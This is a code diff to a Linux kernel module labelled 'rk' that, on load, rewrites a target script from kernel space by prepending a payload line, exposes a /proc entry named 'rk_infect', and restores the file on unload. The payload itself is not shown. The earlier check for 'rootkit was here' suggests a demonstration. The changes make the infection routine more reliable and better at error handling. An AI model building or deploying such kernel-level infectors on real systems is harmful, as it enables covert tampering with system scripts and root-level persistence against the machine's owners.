@@ -11,11 +11,13 @@
 #define PAYLOAD_LEN   (sizeof(PAYLOAD_LINE) - 1)
 
 static struct proc_dir_entry *proc_entry;
-static char original[512];
+#define ORIGINAL_MAX 512
+
+static char original[ORIGINAL_MAX];
 static ssize_t orig_len;
 static bool infected;
 
-static int read_file(const char *path, char *buf, size_t maxlen)
+static ssize_t read_file(const char *path, char *buf, size_t maxlen)
 {
 	struct file *f;
 	loff_t pos = 0;
@@ -24,10 +26,8 @@ static int read_file(const char *path, char *buf, size_t maxlen)
 	f = filp_open(path, O_RDONLY, 0);
 	if (IS_ERR(f))
 		return PTR_ERR(f);
-	ret = kernel_read(f, buf, maxlen - 1, &pos);
+	ret = kernel_read(f, buf, maxlen, &pos);
 	filp_close(f, NULL);
-	if (ret >= 0)
-		buf[ret] = '\0';
 	return ret;
 }
 
@@ -42,46 +42,50 @@ static int write_file(const char *path, const char *buf, size_t len)
 		return PTR_ERR(f);
 	ret = kernel_write(f, buf, len, &pos);
 	filp_close(f, NULL);
-	return ret < 0 ? ret : 0;
+	if (ret < 0)
+		return ret;
+	return ret == len ? 0 : -EIO;
 }
 
-static void infect(void)
+static int infect(void)
 {
-	char buf[512];
+	char input[ORIGINAL_MAX + 1];
+	char buf[ORIGINAL_MAX + PAYLOAD_LEN];
 	ssize_t len;
-	loff_t pos;
-	struct file *f;
+	int err;
 
-	len = read_file(TARGET_SCRIPT, original, sizeof(original));
+	len = read_file(TARGET_SCRIPT, input, sizeof(input));
 	if (len < 0) {
 		pr_err("rk: target not found: %s\n", TARGET_SCRIPT);
-		return;
+		return len;
 	}
+	if (len > sizeof(original))
+		return -EFBIG;
 	orig_len = len;
+	memcpy(original, input, orig_len);
 
-	// Prepend payload to original content
-	f = filp_open(TARGET_SCRIPT, O_WRONLY | O_TRUNC, 0);
-	if (IS_ERR(f))
-		return;
-	pos = 0;
-	kernel_write(f, PAYLOAD_LINE, PAYLOAD_LEN, &pos);
-	kernel_write(f, original, orig_len, &pos);
-	filp_close(f, NULL);
+	memcpy(buf, PAYLOAD_LINE, PAYLOAD_LEN);
+	memcpy(buf + PAYLOAD_LEN, original, orig_len);
+	err = write_file(TARGET_SCRIPT, buf, PAYLOAD_LEN + orig_len);
+	if (err)
+		return err;
+	infected = true;
 
-	// Verify injection
-	len = read_file(TARGET_SCRIPT, buf, sizeof(buf));
-	if (len > 0 && strstr(buf, "rootkit was here"))
-		infected = true;
-
-	pr_info("rk: infected %s (%s)\n", TARGET_SCRIPT,
-		infected ? "ok" : "FAIL");
+	pr_info("rk: infected %s\n", TARGET_SCRIPT);
+	return 0;
 }
 
 static void disinfect(void)
 {
-	if (infected && orig_len > 0) {
-		write_file(TARGET_SCRIPT, original, orig_len);
-		pr_info("rk: restored %s\n", TARGET_SCRIPT);
+	if (infected) {
+		int err = write_file(TARGET_SCRIPT, original, orig_len);
+
+		if (err)
+			pr_err("rk: failed to restore %s: %d\n",
+			       TARGET_SCRIPT, err);
+		else
+			pr_info("rk: restored %s\n", TARGET_SCRIPT);
+		infected = false;
 	}
 }
 
@@ -95,11 +99,17 @@ static int proc_read(struct seq_file *m, void *v)
 
 static int __init infect_init(void)
 {
-	infect();
+	int err;
+
+	err = infect();
+	if (err)
+		return err;
 
 	proc_entry = proc_create_single("rk_infect", 0444, NULL, proc_read);
-	if (!proc_entry)
+	if (!proc_entry) {
+		disinfect();
 		return -ENOMEM;
+	}
 
 	return 0;
 }
